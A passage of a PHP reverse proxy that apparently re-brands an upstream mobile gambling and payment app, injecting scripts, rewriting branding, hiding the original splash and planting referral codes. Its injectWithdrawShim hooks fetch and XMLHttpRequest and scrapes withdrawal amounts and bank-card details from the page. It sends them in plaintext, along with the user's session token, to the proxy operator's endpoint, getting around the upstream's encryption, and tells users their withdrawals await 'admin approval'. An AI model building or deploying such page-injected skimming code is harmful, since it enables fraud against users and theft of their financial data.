        . 'function go(u){try{var p=new URL(u,location.href).pathname.replace(/\\/+$/,"")||"/";var d=norm(p)||u;'
        . 'try{if(document.documentElement)document.documentElement.style.display="none";}catch(e){}'
        . 'try{location.replace(d);}catch(x){location.href=d;}}catch(e){try{location.href=u;}catch(_){}}}'
        . '["pushState","replaceState"].forEach(function(m){try{var o=history[m];'
        . 'history[m]=function(s,t,u){if(u!=null&&mine(u)){go(u);return;}return o.apply(this,arguments);};}catch(e){}});'
        . 'function guard(){try{var p=(location.pathname||"").replace(/\\/+$/,"")||"/";var d=norm(p);'
        . 'if(d&&location.pathname!==d){go(d);return;}'
        . 'if(mine(location.href)&&document.querySelector("#mc-header")&&!document.querySelector(\'script[src*="/m/assets/"]\')){go(location.href);}}catch(e){}}'
        . 'window.addEventListener("popstate",function(){setTimeout(guard,0);});window.addEventListener("hashchange",guard);'
        . 'guard();'
        . '})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace('/(<head[^>]*>)/i', '$1' . $out, $html, 1);
    }
    return $out . $html;
}

/**
 * Withdraw intent beacon: the upstream withdraw POST body is RSA/DES
 * encrypted, so PHP cannot read the amount. This shim mirrors plaintext
 * {amount, cardHint} to /api/withdrawIntent.php just before the encrypted
 * submit, using the same Authorization/Merchant headers so the server maps
 * it to the same sessionKey. It also toasts the queued-approval message and
 * clears the client-side merchantWallet cache so the optimistic balance
 * (balance - hold) paints immediately everywhere.
 */
function injectWithdrawShim(): string
{
    return <<<'HTML'
<script>(function(){
function sess(){try{var s=localStorage.getItem("MC_SESSION_INFO");if(!s)return {};var o=JSON.parse(s);return o&&typeof o==="object"?o:{};}catch(e){return {};}}
function authH(){var s=sess();var h={};if(s.token)h["Authorization"]=s.token;if(s.merchantCode)h["Merchant"]=s.merchantCode;return h;}
function num(v){if(typeof v==="number")return v;if(typeof v!=="string")return 0;var n=parseFloat(v.replace(/[^0-9.]/g,""));return isFinite(n)?n:0;}
function guessAmount(){try{
var els=document.querySelectorAll("input");
for(var i=0;i<els.length;i++){var el=els[i];var t=(el.type||"").toLowerCase();if(t==="number"||/amount|money|withdraw/i.test(el.name||"")||/amount|money|withdraw/i.test(el.placeholder||"")||/amount|money/i.test(el.className||"")){var n=num(el.value);if(n>0)return n;}}
var sel=document.querySelector(".withdraw-amount input, .amount-input input, input.withdraw");
if(sel){var m=num(sel.value);if(m>0)return m;}
var txt=(document.body?document.body.innerText:"")||"";
var mt=txt.match(/(?:withdraw|amount)[^\d]{0,20}(\d[\d,]*\.?\d*)/i);
if(mt)return num(mt[1]);}catch(e){}return 0;}
function guessCard(){try{
var sel=document.querySelector(".bank-card.selected, .card-item.selected, [class*=bank][class*=select]");
if(sel){var t=(sel.innerText||"").replace(/\s+/g," ").trim();if(t)return t.slice(0,64);}
var inp=document.querySelector("input[name*=card],input[placeholder*=card]");
if(inp&&inp.value)return String(inp.value).slice(-8);}catch(e){}return "";}
function beacon(){try{
var a=guessAmount();if(!(a>0))return;
var h=authH();h["Content-Type"]="application/json";
fetch("/api/withdrawIntent.php",{method:"POST",credentials:"same-origin",headers:h,body:JSON.stringify({amount:a,cardHint:guessCard()})}).catch(function(){});}catch(e){}}
function isWd(u){return typeof u==="string"&&(/\/wps\/v2\/transaction\/withdraw/i.test(u)||/\/wps\/transaction\/withdraw/i.test(u));}
function toastQueued(t){try{var d;try{d=JSON.parse(t);}catch(e){return;}if(d&&d.queued===true){try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);if(k&&k.indexOf("_cache_")===0&&/merchantWallet|wallets/i.test(sessionStorage.getItem(k)||"")===false){}}catch(e){}try{var keys=[];for(var j=0;j<sessionStorage.length;j++){keys.push(sessionStorage.key(j));}keys.forEach(function(k){if(k&&k.indexOf("_cache_")===0)sessionStorage.removeItem(k);});}catch(e){}var m=d.message||"Withdraw request received. Waiting for admin approval.";if(window.pxToast)window.pxToast(m);else alert(m);}}catch(e){}}
if(window.fetch){var of=window.fetch;window.fetch=function(u,o){try{var url=typeof u==="string"?u:(u&&u.url)||"";if(isWd(url)&&o&&/post/i.test(o.method||""))beacon();}catch(e){}return of.apply(this,arguments).then(function(r){try{var ct=(r.headers.get("content-type")||"").toLowerCase();if(ct.indexOf("json")!==-1){r.clone().text().then(toastQueued).catch(function(){});}}catch(e){}return r;});}
var oOpen=XMLHttpRequest.prototype.open, oSend=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){try{this._pxWd=isWd(u)&&/post/i.test(m||"");}catch(e){}return oOpen.apply(this,arguments);};
XMLHttpRequest.prototype.send=function(b){try{if(this._pxWd)beacon();}catch(e){}this.addEventListener("load",function(){try{if(this.responseText)toastQueued(this.responseText);}catch(e){}});return oSend.apply(this,arguments);};
})();</script>
HTML;
}

/**
 * Boot shim for mobile /m/ - hides the upstream splash and blocks the promo
 * popups it opens on its own. Injected only on /m/* HTML to avoid affecting
 * desktop.
 *
 * The splash used to be a full-screen /img/splash.png overlay held for ~2.2s.
 * Both of its jobs are now done without putting an image in front of the
 * visitor:
 *
 *   - the upstream's own loader (.loading-img-container) is hidden outright,
 *     so the old branding can never paint and there is no splash to dismiss;
 *   - promo popups (app-install nudges, raffle offers, slot-machine promos)
 *     appear with no tap behind them, right after boot. A modal the visitor
 *     opened themselves is left alone: an overlay only counts as automatic if
 *     it turns up while the page has been idle, or if its name marks it as a
 *     known automatic promo.
 *
 * Our own pages (mobile/*.html) are served raw by serveLocalPage() and never
 * get this.
 */
function injectBootShim(string $html): string
{
    $boot = <<<'HTML'
<style id="px-boot-style">
/* the upstream splash: it paints over the page with its own branding before the
   app mounts. Nothing is lost by never showing it. */
.loading-img-container{display:none!important}
</style>
<script>(function(){
/* Diagnostics: lets a support check confirm the shim is live on a page
   without reading the DOM for a popup that should not be there. */
var D=window.__pxBoot={kills:0,scans:0,observer:false,sweep:false,error:null};
/* Overlays that are promotional by name: opened by the upstream's own boot
   logic, never by a tap. */
var AUTO=/(app[_-]?popup|popup-(ios|android|homescreen|profile)|RecommendHotGame|TemuPopup|ExtraPromotion|FreeSpin|SlotMachinePopup)/i;
/* How long the page must be idle before a new overlay counts as automatic. A
   dialog the visitor just opened shows within a frame of their tap, so this
   never hides the one they asked for. */
var IDLE=1200;
var lastInput=Date.now();
["pointerdown","touchstart","mousedown","keydown"].forEach(function(t){
  document.addEventListener(t,function(){lastInput=Date.now();},true);
});
function isOverlay(el){
  if(!(el instanceof Element))return false;
  /* Never the page itself. The upstream flags an open promo by putting
     `popup-on` on <body>, so a rule that only looked at "fixed, full-screen,
     high z-index" would match the whole document and blank the site. */
  if(el===document.body||el===document.documentElement)return false;
  if(el.closest("#px-menu,#px-menu-scrim"))return false;
  if(el.closest("[data-px-keep]"))return false;
  /* Likewise anything that carries the app root: that is the page, not a
     popup that happens to sit on top of it. */
  if(el.id==="root"||el.id==="app"||el.querySelector("#mc-app-home-root,#root,#app"))return false;
  var cs;
  try{cs=getComputedStyle(el);}catch(e){return false;}
  if(cs.display==="none"||cs.visibility==="hidden"||+cs.opacity===0)return false;
  if(cs.position!=="fixed"&&cs.position!=="absolute")return false;
  var r=el.getBoundingClientRect();
  var vw=window.innerWidth||document.documentElement.clientWidth||1;
  var vh=window.innerHeight||document.documentElement.clientHeight||1;
  if(r.width<vw*0.5||r.height<vh*0.3)return false;          /* toasts stay */
  if(parseInt(cs.zIndex||"0",10)<900)return false;
  return true;
}
function kill(el){
  try{
    D.kills++;
    el.setAttribute("data-px-autopopup","1");
    el.style.setProperty("display","none","important");
    /* the dimmed backdrop is usually a sibling, not a child */
    var p=el.parentElement;
    if(p){
      var kids=p.children;
      for(var i=0;i<kids.length;i++){
        var s=kids[i];
        if(s===el)continue;
        if(s.id==="root"||s.id==="app"||s.querySelector("#mc-app-home-root,#root,#app"))continue;
        var c=(s.className&&s.className.baseVal!==undefined?s.className.baseVal:s.className)||"";
        if(/mask|overlay|popup|modal/i.test(String(c))){
          s.setAttribute("data-px-autopopup","1");
          s.style.setProperty("display","none","important");
        }
      }
    }
    /* The upstream flags "a promo is open" by adding a class to <body>; leave
       it and the page keeps the scroll lock the popup installed. */
    try{
      if(document.body&&/\bpopup-on\b/.test(String(document.body.className||""))){
        document.body.className=String(document.body.className).replace(/\bpopup-on\b/g,"").replace(/\s+/g," ");
      }
    }catch(e){}
  }catch(e){}
}
var SEL="[class*='popup'],[class*='Popup'],[class*='modal'],[class*='Modal'],[class*='mask'],[class*='Mask']";
function check(node){
  try{
    if(!(node instanceof Element))return;
    D.scans++;
    var els=[node];
    if(node.querySelectorAll){
      try{els=els.concat(Array.prototype.slice.call(node.querySelectorAll(SEL)));}catch(e){}
    }
    var idle=(Date.now()-lastInput)>IDLE;
    for(var i=0;i<els.length;i++){
      /* One element must never be able to disable the whole watcher, so every
         candidate is evaluated on its own: the upstream tree is large and
         exotic (SVG, shadow roots, detached nodes) and a single throw used to
         abort start() before the observer and the sweep were ever installed. */
      try{
        var el=els[i];
        if(!el||!el.getAttribute)continue;
        if(el.getAttribute("data-px-autopopup"))continue;
        var cls=(el.className&&el.className.baseVal!==undefined?el.className.baseVal:el.className)||"";
        var hay=String(cls)+" "+(el.id||"");
        if(!AUTO.test(hay)&&!idle)continue;
        if(isOverlay(el))kill(el);
      }catch(e){}
    }
  }catch(e){D.error=String(e&&e.message||e);}
}
function sweep(){
  D.sweep=true;
  var list;
  try{list=document.querySelectorAll(SEL);}catch(e){return;}
  for(var i=0;i<list.length;i++)check(list[i]);
}
function start(){
  /* documentElement, not body: the upstream can replace <body> wholesale, and
     an observer bound to the old node then sees nothing again. */
  try{
    var mo=new MutationObserver(function(recs){
      for(var i=0;i<recs.length;i++){
        var added=recs[i].addedNodes;
        for(var j=0;j<added.length;j++)check(added[j]);
      }
    });
    mo.observe(document.documentElement,{childList:true,subtree:true});
    D.observer=true;
  }catch(e){D.error=String(e&&e.message||e);}
  /* Slow sweep: the upstream may flip display on a node it already owns,
     which a childList observer never sees. */
  try{window.setInterval(sweep,1200);}catch(e){}
  check(document.body);                      /* already open at boot */
  window.addEventListener("load",sweep);
}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",start);
else start();
})();</script>
HTML;
    if (preg_match('/<body[^>]*>/i', $html)) {
        return preg_replace('/(<body[^>]*>)/i', '$1' . $boot, $html, 1);
    }
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace('/(<head[^>]*>)/i', '$1' . $boot, $html, 1);
    }
    return $boot . $html;
}


/**
 * Download a resource from upstream and store it locally.
 * Only for static /res/* assets — HTML never cached.
 */
function cacheResource(string $relPath): void
{
    if (CACHE_TTL === 0) return; // cache disabled
    // Strip query string for local file path
    $localPath = preg_replace('/\?.*$/', '', $relPath);
    $local = CACHE_DIR . '/' . ltrim($localPath, '/');

    // Already cached and fresh?
    if (is_file($local) && (time() - filemtime($local)) < CACHE_TTL) {
        return;
    }

    $dir = dirname($local);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }

    // Fetch with original path (including query string for cache busting)
    $url = activeUpstream() . $relPath;
    $ch = curl_init($url);
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        // Hard-bounded on purpose: this runs inside a visitor's request, so a slow
        // upstream must not hold a PHP worker for a minute - that is exactly what
        // exhausts the worker pool and makes the whole site look down under load.
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_TIMEOUT        => 8,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_ENCODING       => '',
        CURLOPT_USERAGENT      => clientUserAgent(),
        CURLOPT_TCP_KEEPALIVE  => 1,
        CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
        CURLOPT_HTTPHEADER     => [
            'Accept: */*',
            'Referer: ' . activeUpstream() . '/',
        ],
    ] + upstreamHttpVersionOpt();
    $share = upstreamCurlShare();
    if ($share !== null) {
        $opts[CURLOPT_SHARE] = $share;
    }
    curl_setopt_array($ch, $opts);
    $data = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if ($data !== false && $code >= 200 && $code < 400) {
        writeCacheFile($local, $data);
    }
}

/**
 * Write a cache file atomically.
 *
 * A plain file_put_contents() can be read back by a concurrent request while it
 * is still being written, which serves a half-written CSS/JS to that visitor and
 * keeps doing so until the entry expires. rename() over the same filesystem is
 * atomic, so a reader only ever sees the old file or the complete new one.
 */
function writeCacheFile(string $file, string $data): void
{
    $dir = dirname($file);
    if (!is_dir($dir) && !@mkdir($dir, 0755, true) && !is_dir($dir)) {
        return;
    }
    $tmp = $file . '.tmp.' . getmypid();
    if (@file_put_contents($tmp, $data) === false) {
        return;
    }
    if (!@rename($tmp, $file)) {
        @unlink($tmp);
    }
}

/**
 * Serve whatever copy of a path we have on disk, regardless of its age.
 * Used only when the upstream fetch failed, where stale beats an error page.
 */
function serveStale(string $path): bool
{
    if (CACHE_TTL === 0 || !isCacheable($path)) {
        return false;
    }
    $file = cacheFileFor($path);
    if (!is_file($file)) {
        return false;
    }
    serveFile($file, true);
    return true;
}

/**
 * Occasionally delete cache entries that are well past their TTL.
 *
 * Expired entries are otherwise only replaced on demand and never removed, so
 * the cache only grows - and a full disk takes the whole site down. Sampling a
 * fraction of writes keeps this from costing anything per request.
 */
function gcCache(): void
{
    if (CACHE_TTL === 0 || mt_rand(1, 200) !== 1) {
        return;
    }
    if (!is_dir(CACHE_DIR)) {
        return;
    }
    $cutoff = time() - (CACHE_TTL * 3);
    $removed = 0;
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator(CACHE_DIR, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it as $entry) {
            if ($removed >= 300) {
                break;
            }
            if ($entry->isFile() && $entry->getFilename() !== '.htaccess' && $entry->getMTime() < $cutoff) {
                if (@unlink($entry->getPathname())) {
                    $removed++;
                }
            }
        }
    } catch (Exception $e) {
        return;
    }
}

/**
 * Should the response be cached locally? Only static, GET resources.
 * HTML never cached — always inject fresh.
 */
function isCacheable(string $path): bool
{
    if (CACHE_TTL === 0) return false;
    if (isAuthTraffic($path)) return false; // login/logout: never stored, never served stale
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
    if ($method !== 'GET') {
        return false;
    }
    if (strpos($path, '/res/') === 0) {
        return true;
    }
    $ext = strtolower(pathinfo(parse_url($path, PHP_URL_PATH) ?: '', PATHINFO_EXTENSION));
    return in_array($ext, ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico',
        'woff', 'woff2', 'ttf', 'webp', 'mp4', 'webm', 'json'], true);
}

/**
 * Login/logout traffic. Session identity is created and destroyed here, so
 * these responses must never sit in any cache (disk, browser, or middlebox).
 * Matches the app's auth routes (see bundles: /wps/session/login*,
 * /wps/session/logout, /m/login, /m/logout, loginChange, gameLogout).
 */
function isAuthTraffic(string $path): bool
{
    $p = strtolower(parse_url($path, PHP_URL_PATH) ?: $path);
    foreach (['/session/login', '/session/logout', '/m/login', '/m/logout',
        'gamelogout', 'loginchange', '/verification/'] as $needle) {
        if (strpos($p, $needle) !== false) {
            return true;
        }
    }
    return false;
}

/**
 * Identity fingerprint of the current visitor, from the headers that carry
 * session state. Empty when the visitor sent none (anonymous).
 */
function requestSessionKey(): string
{
    $jar = ($_SERVER['HTTP_COOKIE'] ?? '') . "\n"
        . ($_SERVER['HTTP_AUTHORIZATION'] ?? '') . "\n"
        . ($_SERVER['HTTP_ENCRYPTION'] ?? '') . "\n"
        . ($_SERVER['HTTP_X_GATEWAY_VERSION'] ?? '');
    return trim(str_replace("\n", '', $jar)) === '' ? '' : md5($jar);
}

/**
 * Whether a cacheable path is identical for every visitor (safe on the shared
 * key) or must be isolated per session. Binary assets and content-hashed
 * bundles (vendor.0.6ad9d39.js) are the same bytes for all users. Anything
 * else — JSON, unversioned scripts, extensionless API paths — can carry one
 * user's data (profile, balance, session) and must never be served to another.
 */
function isSharedStatic(string $path): bool
{
    if (requestSessionKey() === '') {
        return true; // anonymous: nothing user-specific can be in play
    }
    $p = strtolower(parse_url($path, PHP_URL_PATH) ?: '');
    $ext = pathinfo($p, PATHINFO_EXTENSION);
    if (in_array($ext, ['png', 'jpg', 'jpeg', 'gif', 'svg', 'ico',
        'webp', 'woff', 'woff2', 'ttf', 'mp4', 'webm'], true)) {
        return true;
    }
    if (($ext === 'js' || $ext === 'css') && preg_match('/[0-9a-f]{6,}/i', basename($p))) {
        return true;
    }
    return false;
}

/**
 * Disk location for a cacheable path. Per-session entries live under their own
 * directory so user A's JSON can never be served to user B; shared statics
 * keep the existing layout (old entries stay valid).
 */
function cacheFileFor(string $path): string
{
    $rel = ltrim($path, '/');
    if (isSharedStatic($path)) {
        return CACHE_DIR . '/' . $rel;
    }
    return CACHE_DIR . '/sess-' . requestSessionKey() . '/' . $rel;
}

/**
 * Whether an upstream response may be stored. Responses that set cookies or
 * are marked private/no-store belong to one visitor and must never be shared.
 */
function cacheStoreAllowed(array $respHeaders): bool
{
    foreach ($respHeaders as $h) {
        if (!is_string($h)) continue;
        if (stripos($h, 'set-cookie:') === 0) {
            return false;
        }
        if (preg_match('/^cache-control\s*:/i', $h)) {
            $v = strtolower($h);
            if (strpos($v, 'private') !== false || strpos($v, 'no-store') !== false) {
                return false;
            }
        }
    }
    return true;
}

/**
 * Guess a content type from the path extension.
 */
function guessContentType(string $path): string
{
    $ext = strtolower(pathinfo(parse_url($path, PHP_URL_PATH) ?: '', PATHINFO_EXTENSION));
    $map = [
        'css'   => 'text/css; charset=UTF-8',
        'js'    => 'application/javascript; charset=UTF-8',
        'json'  => 'application/json; charset=UTF-8',
        'html'  => 'text/html; charset=UTF-8',
        'png'   => 'image/png',
        'jpg'   => 'image/jpeg',
        'jpeg'  => 'image/jpeg',
        'gif'   => 'image/gif',
        'svg'   => 'image/svg+xml',
        'ico'   => 'image/x-icon',
        'woff'  => 'font/woff',
        'woff2' => 'font/woff2',
        'ttf'   => 'font/ttf',
        'webp'  => 'image/webp',
        'mp4'   => 'video/mp4',
        'webm'  => 'video/webm',
    ];
    return $map[$ext] ?? 'text/html; charset=UTF-8';
}

/**
 * Serve a cached file with correct headers.
 */
function serveFile(string $file, bool $stale = false): void
{
    global $contentConfig;
    $mime = guessContentType($file);
    $isHtml = stripos($mime, 'text/html') !== false;
    header('Content-Type: ' . $mime);
    if ($stale) {
        // Do not let a stale copy sit in a browser cache for the full TTL.
        header('Cache-Control: public, max-age=60');
    } else {
        header('Cache-Control: ' . ($isHtml ? 'no-cache, must-revalidate' : 'public, max-age=' . CACHE_TTL));
    }
    header('X-Proxy-Cache: ' . ($stale ? 'STALE' : 'HIT'));
    header('Connection: close');

    $data = file_get_contents($file);
    if ($data === false) {
        return;
    }
    $data = applyBrand($data, $mime);
    $data = applyContentJson($data, $mime, $file, is_array($contentConfig) ? $contentConfig : []);
    $data = applyAppIconUrl($data, $mime);
    $data = applySupportUrl($data, $mime);
    $data = applyApkPolicy($data, $mime);
    $data = applyScriptPatches($data, $file, $mime);
    if ($isHtml) {
        $data = injectVoucherShim($data, is_array($contentConfig) ? ($contentConfig['voucher'] ?? []) : []);
        $data = injectReferralShim($data);
        $data = injectAppIconShim($data);
        $data = injectThemeShim($data);
        // The same boot shim the live path applies: a cached copy of an
        // upstream page must not be the one route that still shows the splash
        // and the automatic promo popups. $file is a path on disk, so the
        // separator has to be normalised first - on Windows it is a backslash,
        // '/m/' would never match, and every cached /m/ page would silently
        // keep its splash.
        $cachePath = str_replace('\\', '/', $file);
        if (stripos($cachePath, '/m/') !== false && stripos($cachePath, 'invite') === false) {
            $data = injectBootShim($data);
        }
    }
    header('Content-Length: ' . strlen($data));
    echo $data;
}

/**
 * Serve one of our own pages from <project>/mobile/, byte for byte.
 *
 * Deliberately unlike the upstream pipeline: no brand rewriting, no shims, no
 * splash, no popup blocker. These pages carry their own design system and their
 * own behaviour (see mobile/assets/*), so anything injected here would fight
 * the very markup it is supposed to enhance. The only substitution is
 * applyPagePlaceholders(), which fills admin-configured values.
 */
function serveLocalPage(string $file): void
{
    $pageFile = dirname(__DIR__) . '/mobile/' . $file;
    if (!is_file($pageFile)) {
        http_response_code(404);
        header('Content-Type: text/plain; charset=UTF-8');
        header('Cache-Control: no-store');
        echo 'Not Found';
        exit;
    }

    $data = (string) file_get_contents($pageFile);
    $data = applyPagePlaceholders($data);

    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-cache, must-revalidate');
    header('X-Content-Type-Options: nosniff');
    header('X-Proxy: true');
    header('Content-Length: ' . strlen($data));
    echo $data;
    exit;
}

/**
 * Fill admin-configured values into our own pages.
 *
 * The referral code used to be planted in the browser by an upstream shim, which
 * our pages deliberately do not run (see injectReferralShim). The register form
 * posts the code itself, so it comes from the admin setting here: one source,
 * editable from the panel, no localStorage seeding.
 */
function applyPagePlaceholders(string $html): string
{
    global $appConfig;

    $code = '';
    foreach ([($appConfig['referral_code'] ?? ''), ($appConfig['referral_affiliate_code'] ?? '')] as $c) {
        $c = trim((string) $c);
        if ($c !== '') { $code = $c; break; }
    }

    if ($code === '' || stripos($html, '__PX_REFERRAL_CODE__') === false) {
        return $html;
    }
    return str_replace('__PX_REFERRAL_CODE__', htmlspecialchars($code, ENT_QUOTES), $html);
}
